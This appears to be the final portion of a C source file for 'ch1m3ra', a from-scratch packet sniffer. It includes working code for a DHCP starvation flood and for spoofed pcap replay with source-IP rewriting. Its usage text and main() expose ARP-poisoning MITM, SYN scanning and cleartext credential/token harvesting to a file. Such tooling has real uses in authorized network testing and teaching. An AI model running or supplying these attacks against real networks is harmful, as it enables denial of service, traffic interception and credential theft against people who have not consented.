        d[0] = 1; d[1] = 1; d[2] = 6; d[3] = 0;      /* BOOTREQUEST, htype=ether */
        /* xid */
        uint32_t xid = (uint32_t)(0xdead0000u + i);
        d[4] = xid >> 24; d[5] = xid >> 16; d[6] = xid >> 8; d[7] = xid;
        /* chaddr: random client MAC */
        for (int k = 0; k < 6; k++) d[28 + k] = (uint8_t)(0x02 + (i * 7 + k * 13));
        d[236] = 0x63; d[237] = 0x82; d[238] = 0x53; d[239] = 0x63;   /* magic */
        d[240] = 53; d[241] = 1; d[242] = 1;         /* option 53: DISCOVER */
        d[243] = 55; d[244] = 3; d[245] = 1; d[246] = 3; d[247] = 6;  /* param list */
        d[248] = 255;                                /* end */
        size_t dhcp_len = 249;
        size_t n = build_udp(f, tx.mac, bcast, anyip, bcastip, 68, 67, d, dhcp_len);
        tx_send(f, n);
        sent++;
        if (sent % 32 == 0)
            fprintf(stderr, "ch1m3ra: %ld DHCP DISCOVERs sent\n", sent);
        struct timespec ts = {0, 20000000};
        nanosleep(&ts, NULL);
    }
    fprintf(stderr, "ch1m3ra: dhcp-starve sent %ld DISCOVERs total\n", sent);
    close(tx.fd);
}

/* ---- --replay (with optional --rewrite-src) ---- */
static void replay_run(const char *pcap, const char *rewrite, const char *iface) {
    if (!iface) { fprintf(stderr, "ch1m3ra: --replay needs -i <iface>\n"); exit(2); }
    pcapin_t pr;
    if (pcapin_open(&pr, pcap) != 0) exit(1);
    if (tx_open(iface) != 0) exit(1);

    uint8_t rw[4]; int have_rw = 0;
    if (rewrite && inet_pton(AF_INET, rewrite, rw) == 1) have_rw = 1;

    fprintf(stderr, "%s== replay ==%s %s on %s%s%s%s\n", CRED, C0, pcap, iface,
            have_rw ? "  rewrite-src=" : "", have_rw ? rewrite : "", "");
    long n = 0, edited = 0;
    static uint8_t buf[65536];
    size_t cap, wire; struct timespec ts;
    int rc;
    while ((rc = pcapin_next(&pr, buf, sizeof buf, &cap, &wire, &ts)) == 1) {
        if (cap >= 34 && buf[12] == 0x08 && buf[13] == 0x00 && have_rw) {
            size_t ihl_off = 14 + 12;
            if (memcmp(buf + ihl_off, rw, 4) != 0) {
                memcpy(buf + ihl_off, rw, 4);
                /* recompute IPv4 header checksum */
                size_t ihl = (size_t)(buf[14] & 0xf) * 4;
                buf[14 + 10] = buf[14 + 11] = 0;
                uint16_t ck = ck_fold(ck_add(0, buf + 14, ihl));
                buf[14 + 10] = (uint8_t)(ck >> 8);
                buf[14 + 11] = (uint8_t)ck;
                edited++;
            }
        }
        if (tx_send(buf, cap) == 0) n++;
        struct timespec ts2 = {0, 1000000};
        nanosleep(&ts2, NULL);
    }
    if (rc < 0) { fprintf(stderr, "ch1m3ra: replay read error\n"); }
    fclose(pr.f);
    close(tx.fd);
    printf("ch1m3ra: replayed %ld frame(s), %ld rewritten\n", n, edited);
}

/* ---------- main ---------- */
static void usage(FILE *o, const char *argv0) {
    fprintf(o,
"ch1m3ra " VERSION " - packet sniffer built from scratch (no libpcap)\n"
"\n"
"usage: %s [options]\n"
"  -i <iface>   capture on <iface> (default: all interfaces)\n"
"  -l           list interfaces and exit\n"
"  -r <file>    read packets from a pcap file (no root needed)\n"
"  -w <file>    write captured packets to a pcap file (with -r: filter a pcap offline)\n"
"  -H <host>    only packets matching this: IP substring, or a decoded\n"
"               DNS question name / TLS SNI / HTTP Host header\n"
"  -p <port>    only packets with this source or destination port\n"
"  -P <proto>   only this protocol: tcp udp icmp icmpv6 arp ip ipv6 dns tls http frag ...\n"
"  -n <count>   stop after <count> packets\n"
"  -s <len>     snapshot length, bytes captured per packet (default 65535)\n"
"  -B <len>     payload bytes to dump (default 96, 0 = none)\n"
"  -q           quiet: one line per packet, no details or payload\n"
"  -o <fmt>     output format: text (default), json (one object per line,\n"
"               jq-friendly), csv (header row + rows)\n"
"  -e           timestamps relative to the first displayed packet\n"
"  -T <id>      follow a TCP stream: print reassembled payload as text and\n"
"               suppress packet lines (0 = follow every stream; ids shown\n"
"               as #N on packet lines and in the final stats)\n"
"  -F <expr>    kernel BPF filter (tcpdump-like subset): tcp udp icmp icmp6\n"
"               arp ip ip6, port N [src|dst] host ADDR, and/or/not/() with\n"
"               implicit and - e.g. -F 'tcp and port 443'.  Matching runs\n"
"               in the kernel (and in our own interpreter for -r); assumes\n"
"               untagged frames and no IPv6 extension headers\n"
"  -Z           zero-copy capture: kernel writes into an mmap PACKET_RX_RING\n"
"               instead of recvfrom copies (live capture only)\n"
"  -U           interactive TUI: live dashboard with start/stop (s/x),\n"
"               scroll (j/k), pane switch (p), clear (c), follow (f), quit (q)\n"
"  -K           harvest cleartext credentials/tokens (HTTP basic/bearer/form,\n"
"               FTP, POP3, IMAP, SMTP, Telnet, SNMP, cookies, JWTs)\n"
"  -k <file>    like -K but also append each hit to <file>\n"
"  -O           passive OS fingerprint hosts (TTL + TCP options, p0f-style)\n"
"  -Y           top-talkers: rank hosts/conversations by bytes\n"
"  -N           learn hostnames from mDNS/LLMNR/NBNS/DNS responses\n"
"  -E           thorough filtering: parse frames instead of fixed BPF offsets\n"
"               (VLAN- and IPv6-extension-header aware)\n"
"  -M           do not enter promiscuous mode\n"
"  -C           disable colors\n"
"  -h, --help   this help page\n"
"\n"
"offensive / active tools (root + explicit flag; they transmit real packets):\n"
"  --arp-poison <victim>,<gateway>[,<iface>]\n"
"               ARP-spoof the pair to MITM their traffic (Ctrl-C to restore)\n"
"  --syn-scan <host>[:<ports>]\n"
"               half-open port scan; <ports> like 22,80,443 or 1-1024\n"
"  --dhcp-starve <iface>[:<count>]\n"
"               exhaust a DHCP server's pool with random-client DISCOVERs\n"
"  --replay <pcap>          re-send frames from a pcap (edit with --rewrite-src)\n"
"  --rewrite-src <ip>       replace source IP in replayed frames\n"
"\n"
"examples:\n"
"  sudo %s -i wlan0 -P tcp -p 443\n"
"  sudo %s -i eth0 -w capture.pcap\n"
"  sudo %s -i eth0 -Z -F 'tcp and port 443'\n"
"  sudo %s -i wlan0 -U            (interactive TUI, start with s)\n"
"  sudo %s -i wlan0 -K -O -U      (harvest creds + fingerprint, in the TUI)\n"
"  sudo %s -i eth0 --arp-poison 192.168.1.5,192.168.1.1\n"
"  sudo %s -i eth0 --syn-scan 10.0.0.1:22,80,443\n"
"  %s -r capture.pcap -H 8.8.8.8 -B 256\n"
"  %s -r capture.pcap -o json | jq -r 'select(.app==\"dns\") | .dns.qname'\n"
"  %s -r capture.pcap -q        (note stream ids #N, then)\n"
"  %s -r capture.pcap -T 3      ...follow stream 3 as text\n",
    argv0, argv0, argv0, argv0, argv0, argv0, argv0, argv0, argv0, argv0, argv0, argv0);
}

int main(int argc, char **argv) {
    cfg.port = -1;
    int opt;
    static const struct option longopts[] = {
        { "arp-poison",  required_argument, NULL, 1000 },
        { "syn-scan",    required_argument, NULL, 1001 },
        { "dhcp-starve", required_argument, NULL, 1002 },
        { "replay",      required_argument, NULL, 1003 },
        { "rewrite-src", required_argument, NULL, 1004 },
        { "help",        no_argument,       NULL, 'h'  },
        { 0, 0, 0, 0 }
    };
    while ((opt = getopt_long(argc, argv,
                              "i:r:w:H:p:P:n:s:B:T:o:eF:ZUqMChlKk:OYNEC",
                              longopts, NULL)) != -1) {
        switch (opt) {
            case 'i': cfg.iface = optarg; break;
            case 'r': cfg.rfile = optarg; break;
            case 'w': cfg.wfile = optarg; break;
            case 'H': cfg.host = optarg; break;
            case 'K': cfg.harvest = 1; break;
            case 'k': cfg.harvest = 1; cfg.credfile = optarg; break;
            case 'O': cfg.finger = 1; break;
            case 'Y': cfg.talkers = 1; break;
            case 'N': cfg.names = 1; break;
            case 'E': cfg.evasion = 1; break;
            case 1000: cfg.arp_poison = optarg; cfg.active = 1; break;
            case 1001: cfg.syn_scan = optarg; cfg.active = 1; break;
            case 1002: cfg.dhcp_starve = optarg; cfg.active = 1; break;
            case 1003: cfg.replay = optarg; break;
            case 1004: cfg.rewrite_src = optarg; break;
            case 'T':
                cfg.follow = strtol(optarg, NULL, 10);
                if (cfg.follow < 0) {
                    fprintf(stderr, "ch1m3ra: -T needs a stream id >= 0\n"); return 2;
                }
                break;
            case 'p':
                cfg.port = strtol(optarg, NULL, 10);
                if (cfg.port < 0 || cfg.port > 65535) {
                    fprintf(stderr, "ch1m3ra: bad port: %s\n", optarg); return 2;
                }
                break;
            case 'P': cfg.proto = optarg; break;
            case 'n': cfg.count = atol(optarg); break;
            case 's':
                cfg.snaplen = atol(optarg);
                if (cfg.snaplen < 64 || cfg.snaplen > 65535) {
                    fprintf(stderr, "ch1m3ra: -s must be 64..65535\n"); return 2;
                }
                break;
            case 'B':
                cfg.dumpbytes = atol(optarg);
                if (cfg.dumpbytes < 0) cfg.dumpbytes = 0;
                if (cfg.dumpbytes > 65535) cfg.dumpbytes = 65535;
                break;
            case 'q': cfg.quiet = 1; break;
            case 'o':
                if (strcmp(optarg, "text") && strcmp(optarg, "json") && strcmp(optarg, "csv")) {
                    fprintf(stderr, "ch1m3ra: -o must be text, json, or csv\n");
                    return 2;
                }
                cfg.outfmt = optarg;
                break;
            case 'e': cfg.reltime = 1; break;
            case 'F': cfg.bfilter = optarg; break;
            case 'Z': cfg.ring = 1; break;
            case 'U': cfg.tui = 1; break;
            case 'M': cfg.nopromisc = 1; break;
            case 'C': cfg.color = 0; break;
            case 'l': list_ifaces(); return 0;
            case 'h': usage(stdout, argv[0]); return 0;
            default:  usage(stderr, argv[0]); return 2;
        }
    }
    if (cfg.color < 0) cfg.color = isatty(STDOUT_FILENO) && !getenv("NO_COLOR");
    setvbuf(stdout, NULL, _IOLBF, 0);

    /* active tools run instead of a normal capture (they transmit) */
    if (cfg.replay) {
        replay_run(cfg.replay, cfg.rewrite_src, cfg.iface);
        return 0;
    }
    if (cfg.arp_poison)  { arp_poison_run(cfg.arp_poison, cfg.iface); return 0; }
    if (cfg.syn_scan)    { syn_scan_run(cfg.syn_scan, cfg.iface); return 0; }
    if (cfg.dhcp_starve) { dhcp_starve_run(cfg.dhcp_starve, cfg.iface); return 0; }

    if (cfg.bfilter) bpf_compile(cfg.bfilter);   /* fails fast on bad syntax */

    if (cfg.rfile) {
        if (pcapin_open(&cap.pr, cfg.rfile) != 0) return 1;
        cap.pcap_mode = 1;
        if (cfg.ring)
            fprintf(stderr, "ch1m3ra: warning: -Z applies to live capture, ignored with -r\n");
    } else {
        cap.fd = open_live(cfg.iface, &cap.ifindex);
        if (cfg.bfilter && !cfg.evasion) bpf_attach(cap.fd);
        if (cfg.ring && ring_setup(cap.fd) != 0) cfg.ring = 0;
    }
    /* -w works live and in -r mode (offline: filters a pcap into a new one) */
    if (cfg.wfile) cap.wf = open_pcap_write(cfg.wfile);

    struct sigaction sa;
    memset(&sa, 0, sizeof sa);
    sa.sa_handler = on_sigint;
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);

    if (cfg.tui) return tui_run();

    /* banner on stderr so stdout stays pure packet data */
    fprintf(stderr, "%sch1m3ra " VERSION "%s - raw AF_PACKET, all decoding done here\n",
            CWHT, C0);
    if (cap.pcap_mode) fprintf(stderr, "  source  : %s (pcap file)\n", cfg.rfile);
    else if (cfg.iface)
        fprintf(stderr, "  device  : %s (ifindex %d%s)\n", cfg.iface, cap.ifindex,
                cfg.nopromisc ? "" : ", promisc");
    else fprintf(stderr, "  device  : all interfaces\n");
    {
        char fbuf[256];
        fbuf[0] = 0;
        if (cfg.proto) lst(fbuf, sizeof fbuf, "proto=%s", cfg.proto);
        if (cfg.host)  lst(fbuf, sizeof fbuf, "host=%s", cfg.host);
        if (cfg.port >= 0) lst(fbuf, sizeof fbuf, "port=%ld", cfg.port);
        if (cfg.bfilter) lst(fbuf, sizeof fbuf, "bpf=%s", cfg.bfilter);
        if (!fbuf[0]) snprintf(fbuf, sizeof fbuf, "none");
        fprintf(stderr, "  filter  : %s\n", fbuf);
    }
    if (cfg.ring) fprintf(stderr, "  capture : PACKET_RX_RING zero-copy (tp_frame=%u x%u)\n",
                          ring_req.tp_frame_size, ring_req.tp_frame_nr);
    if (cfg.evasion) fprintf(stderr, "  evasion : -E thorough filtering (parsed, VLAN/ext-aware)\n");
    if (cfg.harvest) fprintf(stderr, "  harvest : credentials/tokens/banners%s%s\n",
                             cfg.credfile ? " -> " : "", cfg.credfile ? cfg.credfile : "");
    if (cfg.finger)  fprintf(stderr, "  finger  : passive OS fingerprinting on\n");
    if (cfg.talkers) fprintf(stderr, "  talkers : top-talker ranking on\n");
    if (cfg.names)   fprintf(stderr, "  names   : mDNS/LLMNR/NBNS/DNS harvesting on\n");
    fprintf(stderr, "  payload : %s\n\n",
            cfg.quiet ? "quiet" : (cfg.dumpbytes ? "dump up to requested bytes" : "off"));

    static uint8_t buf[65536];
    long capbuf = cfg.snaplen < 65536 ? cfg.snaplen : 65536;

    while (!g_stop) {
        const uint8_t *frame = buf;
        size_t capn = 0, wire = 0;
        struct timespec ts = {0, 0};
        int have_dir = 0, out = 0;
        char ifn[IF_NAMESIZE] = "";

        int rc = capture_next(buf, (size_t)capbuf, &frame, &capn, &wire, &ts,
                              &have_dir, &out, ifn);
        if (rc == 0) break;
        if (rc == -1) return 1;
        if (rc == 2) continue;                 /* EINTR */

        process_frame(frame, capn, wire, &ts, ifn, have_dir, out);
        if (cfg.count > 0 && (long long)st.shown >= cfg.count) break;
    }

    if (cap.wf) fclose(cap.wf);
    if (cap.pcap_mode) fclose(cap.pr.f);
    print_stats();
    if (cap.fd >= 0) { ring_stats(cap.fd); close(cap.fd); }
    if (ring_map) munmap(ring_map, ring_len);
    streams_cleanup();
    recon_cleanup();
    if (cfg.credfile) credfile_close();
    return 0;
}
